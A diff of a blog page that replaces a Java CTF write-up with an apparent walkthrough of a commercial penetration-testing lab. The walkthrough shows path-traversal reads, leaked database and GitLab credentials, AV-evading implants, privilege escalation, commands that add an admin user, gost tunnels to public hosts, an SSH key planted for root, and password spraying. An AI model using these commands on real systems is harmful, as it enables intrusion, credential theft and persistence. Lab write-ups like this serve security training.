@@ -11,7 +11,7 @@
   <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-  <title>2025Aliyun CTF Jtools | Godown_blog</title>
+  <title>春秋云镜 Vertex | Godown_blog</title>
 
   <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
   <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
@@ -591,14 +591,14 @@
 
 
 <div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
-  background-position: center center;position: relative;background-image:url('https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8133.jpg')">
+  background-position: center center;position: relative;background-image:url('https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8194.jpg')">
   <div class="post-detail-header-mask"></div>
   <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
   
   <div class="post-detail-header_info-box">
     <div class="title-box">
       <span class="title">
-        2025Aliyun CTF Jtools
+        春秋云镜 Vertex
       </span>
     </div>
     
@@ -619,140 +619,184 @@
   <div class="main-content">
     <article class="post post-detail">
       <div class="post-content">
-        <p>第三届阿里云CTF，复现两道JAVA，应该很多地方都能找到靶场。我是用的赛后环境，趁热用<a target="_blank" rel="noopener" href="https://www.aliyunctf.com/challenges">https://www.aliyunctf.com/challenges</a></p>
-<p>结果发现第二道需要手动构造链表反序列化，大败而归</p>
-<h2 id="Jtools"><a href="#Jtools" class="headerlink" title="Jtools"></a>Jtools</h2><h3 id="找到入口"><a href="#找到入口" class="headerlink" title="找到入口"></a>找到入口</h3><p>现在JAVA题都已经演变成这种了吗，TM谁能想到找黑名单当hint啊？找到hint还得慢慢找入口类</p>
-<p>解压后，idea配好JAR运行程序，直接导入Jtools.jar为库，就可以直接断点调试了</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227204557175.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227204557175.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>入口只有一个，就是com.app.Server </p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227192334666.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227192334666.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>用MANIFEST.MF定义了jar文件的入口为com.app.Server</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227193007081.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227193007081.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>审计Server，就是个使用Fury库反序列化Base64编码的数据</p>
-<p>Fury基本语法可以看apache fury官网：<a target="_blank" rel="noopener" href="https://fury.apache.org/zh-CN/docs/guide/java_object_graph_guide/">https://fury.apache.org/zh-CN/docs/guide/java_object_graph_guide/</a></p>
-<p>但是没必要学会怎么使用，下面这个语句就是创建一个解析JAVA语言的Fury实例</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Fury</span> <span class="variable">fury</span> <span class="operator">=</span> Fury.builder().withLanguage(Language.JAVA).requireClassRegistration(<span class="literal">false</span>).build();</span><br></pre></td></tr></table></figure>
+        <p>最后一把，打完备战招聘了，最后一个ROCD照着打都没打出来，糖丸了</p>
+<h2 id="春秋云镜-Vertex"><a href="#春秋云镜-Vertex" class="headerlink" title="春秋云镜 Vertex"></a>春秋云镜 Vertex</h2><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p><a target="_blank" rel="noopener" href="http://39.101.78.67:8000/">http://39.101.78.67:8000</a></p>
+<p>注册可以直接修改role为admin</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260322194353525.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260322194353525.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260322194353525"></p>
+<p>UserList有个导出功能</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260322194614520.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260322194614520.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260322194614520"></p>
+<p>这里有个任意文件下载</p>
+<p>网站为asp.net框架，可以读取网站根目录的默认配置文件，web.config</p>
+<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/aspnet/core/host-and-deploy/iis/web-config?view=aspnetcore-10.0">https://learn.microsoft.com/en-us/aspnet/core/host-and-deploy/iis/web-config?view=aspnetcore-10.0</a></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260322194654983.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260322194654983.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260322194654983"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/User/DownloadFile?download=Export&amp;fileName=../web.Config</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227193411923.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227193411923.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>OK拿着WP装模作样调一下</p>
-<p>跟进到Fury.deserialize，调用了另外一个参数的deserialize</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227210936917.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227210936917.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p><code>deserialize(MemoryBuffer buffer, Iterable&lt;MemoryBuffer&gt; outOfBandBuffers)</code>就是根据魔数选用不同的反序列化，这里肯定不是XLANG协议，进到readRef</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227211236191.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227211236191.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>readRef调用readDataInternal</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227211318882.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227211318882.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>readDataInternal根据传入的对象类型选择不同的反序列化器。如果传的不是基础类型，就默认进到default调用对应反序列化器的read方法</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227211413339.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227211413339.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>从这里看不出fury有什么漏洞</p>
-<p>注意到native-image.properties中，把DisallowedList也放到了启动时加载的类中</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227213421035.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227213421035.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>读到有sqlServer的账户密码</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260322200201721.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260322200201721.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260322200201721"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user id=sa;password=Sa1pYbSM!dsQ</span><br></pre></td></tr></table></figure>
+
+<p>MDUT直接上</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260322200502684.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260322200502684.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260322200502684"></p>
+<p>上去whoami发现是sql权限</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260322200615266.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260322200615266.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260322200615266"></p>
+<p>传了两遍免杀的c2马发现都被杀了</p>
+<p>看了下只开了windows Defender</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260322201946188.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260322201946188.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260322201946188"></p>
+<p>用eaas.xred最新的在线免杀(免360杀版)传个bind马正向</p>
+<p>噢，端口也不对外开放的，那只能土豆提权了</p>
+<p>忘了掩日免杀后不能传参数了</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260322215701543.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260322215701543.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260322215701543"></p>
+<p>clone sweetPotato，vs community打开</p>
+<p>下载.NETFramework,Version&#x3D;v4.6.1：<a target="_blank" rel="noopener" href="https://dotnet.microsoft.com/zh-cn/download/dotnet-framework/thank-you/net461-developer-pack-offline-installer">https://dotnet.microsoft.com/zh-cn/download/dotnet-framework/thank-you/net461-developer-pack-offline-installer</a></p>
+<p>还原一下NuGet程序包</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260323170439322.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260323170439322.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260323170439322"></p>
+<p>ai分析下</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260323172740563.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260323172740563.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260323172740563"></p>
+<p>经过一个小小的带参调试这个c#+.net程序，得知programArgs可以把命令写死，就不用传参（from夏饭，这思路nb）</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260323185913891.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260323185913891.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260323185825087.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260323185825087.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260323185825087"></p>
+<p>于是写死参数，再过一遍免杀</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">programArgs = &quot;/c <span class="built_in">net</span> user godown qwerQ!<span class="number">1234</span> /add &amp;&amp; <span class="built_in">net</span> localgroup administrators godown /add&quot;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260323211831946.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260323211831946.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260323211831946"></p>
+<p>nima为什么sb大模型老是道德教育我，tmd谁研究的啊</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260323211811874.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260323211811874.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260323210731344"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260323212130032.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260323212130032.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260323212130032"></p>
+<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>反手把WD关掉（不会关的可以宣布退出安全圈了）</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260323213022682.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260323213022682.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260323213022682"></p>
+<p>好多人啊，poc真多</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260323213453217.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260323213453217.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260323213453217"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">192.168.8.9 本机</span><br><span class="line">192.168.8.26:8080 JSP</span><br><span class="line">192.168.8.42 gitlab signin</span><br><span class="line">192.168.8.146 heapdump spring2初步推测能打shiro</span><br></pre></td></tr></table></figure>
+
+<p>代理出来打192.168.8.26</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gost -L socks5://:5555?bind=true</span><br><span class="line">gost -L rtcp://:2222/8.130.144.164:22 -F socks5://8.130.144.164:5555</span><br></pre></td></tr></table></figure>
+
+<p>访问他</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260323214540681.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260323214540681.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260323214540681"></p>
+<p>在提前看过wp的情况下，我知道这里是打put文件上传，想用yakit扫一遍，但是yakit设置了url也不会扫backup路径，只会扫根路径，可能是我没配置对？</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324141041902.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324141041902.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260324141041902"></p>
+<p>先接着打吧，upload可以直接未授权查看文件</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324141348028.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324141348028.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260324141348028"></p>
+<p>大party生成一个jsp蚁剑内存马</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324141002730.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324141002730.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260324141002730"></p>
+<p>CVE-2017-12615直接PUT文件上传</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324151819636.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324151819636.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260324151819636"></p>
+<p>然后jsp路径在upload的上层（通常upload&#x2F;都是不解析的</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324151742588.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324151742588.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260324151742588"></p>
+<p>上线后虽然是域用户，不过是低权限</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324151929474.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324151929474.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260324151929474"></p>
+<p>依旧上传刚才的古法免杀马（不过没开3306</p>
+<p>查看杀软，额没有杀软，直接上传土豆提权就行了</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324152335237.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324152335237.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260324152335237"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324152610682.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324152610682.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260324152610682"></p>
+<p>flag{c37b368f-8585-47d7-adf2-0c04c8ef30a3}</p>
+<h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>192.168.8.16:8080</p>
+<p>jenkins，有弱密码admin&#x2F;admin123</p>
+<p>上线看到jenkins 2.452.3</p>
+<p>直接进到&#x2F;manage&#x2F;script，命令执行</p>
+<p><code>println &quot;whoami&quot;.execute().text</code></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324153329948.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324153329948.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260324153329948"></p>
+<p>添加用户rdp上去</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324153938756.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324153938756.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260324153938756"></p>
+<p>flag{8bef2d26-91a8-481d-a883-cfd3b0e2ce5a}</p>
+<h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>jenkins配置文件中找到gitlab的密钥C:\ProgramData\Jenkins.jenkins\credentials.xml</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324154139758.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324154139758.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260324154139758"></p>
+<p>去控制台解密</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">println(hudson.util.Secret.fromString(&quot;&#123;AQAAABAAAAAgqoi+w8f2N/rXi0qZEha5nGPamO0CIjokzT/a64spCEBqrIv7dFOC/dVxZwp+6CCU&#125;&quot;).getPlainText())</span><br></pre></td></tr></table></figure>
+
+<p>总感觉我打过这个？？？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">glpat-2Z7YFA6k57s93VHMvHxh</span><br></pre></td></tr></table></figure>
+
+<p>带着密钥授权访问gitlab 也就是42主机</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324154449942.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324154449942.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260324154449942"></p>
+<p>一共5个项目，把backup clone下来</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324154552752.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324154552752.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260324154552752"></p>
+<p><code>git clone http://192.168.8.42:glpat-2Z7YFA6k57s93VHMvHxh@192.168.8.42/vertexsoft/vertexsoftbackup.git</code></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324155049128.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324155049128.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260324155049128"></p>
+<p>flag{7bc76381-d76e-45af-99d6-9ac19baabf53}</p>
+<h3 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h3><p>另一台靶机8.130.159.17未授权heapdump</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260121202133572.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260121202133572.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260121202133572"></p>
+<p>依旧rememberme</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324155557807.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324155557807.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260324155557807"></p>
+<p>依旧注入内存马</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324155732387.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324155732387.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260324155732387"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324155901768.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324155901768.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260324155901768"></p>
+<h3 id="flag6"><a href="#flag6" class="headerlink" title="flag6"></a>flag6</h3><p>wait？！146主机？这不是flag2扫出来那台主机吗，原来是同一台啊</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324160158917.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324160158917.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260324160158917"></p>
+<p>fscan依旧慢的读不到回显，心生一老计，写ssh后登上去</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApTC6dO0d4Zm9+WZXB4R0rPLjRx3qIIdF1lknMKPU+TW3h+tHdQ4NA1gm2WKfmoxUxzIDrs5QbPN0PBXkIcU6YFN3WlRXy3figTpxOP9qHKhrjx4jtHd/HI6CdLNUKqvqZRLqT8mlxVz9IdfETmyQ+d994EDk918s3xgQbii/aLYMBA5mMNHJSe0dBjdYLG/YKNE68HT0GoE5/XIQyFecJEpuTqKtJFPjFbuwE66qJLMc38ZDRDTaUOX9jQnyH09VHj37oL5LLj6MbwFmk77o0D3JxcGod8zyHzu+isQJe84DHEcdEAMrHivk81ISrDV2b9YlYd36lJJGHZaT3xyHNw==&quot;</span> &gt;&gt; /root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+
+<p>我这个fscan不知道为什么没有mysql爆破的功能</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324161554193.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324161554193.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260324161554193"></p>
+<p>按理说有个这个</p>
+<p><code>mysql 192.168.8.38:3306:root 123456</code></p>
+<p>但是0人在意，挂代理直接连</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gost -L socks5://:5555?bind=true</span><br><span class="line">gost -L rtcp://:2222/8.146.237.71:22 -F socks5://8.146.237.71:5555</span><br></pre></td></tr></table></figure>
+
+<p>navicat连了一万年连上了，connect有延时是吧，才会导致MDUT超时连接不上</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324162739637.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324162739637.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260324162739637"></p>
+<p>那我直接把超时改成120s，你如何应对（敏锐的嗅觉这一块</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324163417928.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324163417928.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260324163417928"></p>
+<p>进去后UDF提权</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324163458035.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324163458035.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260324163458035"></p>
+<p>依旧添加用户</p>
+<p><code>net user godown qwerQ!1234 /add &amp;&amp; net localgroup administrators godown /add</code></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324163706631.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324163706631.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260324163706631"></p>
+<p>flag{0d9d3afa-8c5c-43ca-8799-6b84355823c5}</p>
+<h3 id="flag7"><a href="#flag7" class="headerlink" title="flag7"></a>flag7</h3><p>C:\Users\Administrator\Documents\ROAdmins.xlsx下下来</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324163821956.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324163821956.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260324163821956"></p>
+<p>喷洒一波密码(不加-q proxychains一直报告，烦死了)</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q crackmapexec smb 192.168.8.1/24 -u user.txt -p pass.txt --no-bruteforce</span><br></pre></td></tr></table></figure>
+
+<p>好多过期密码</p>
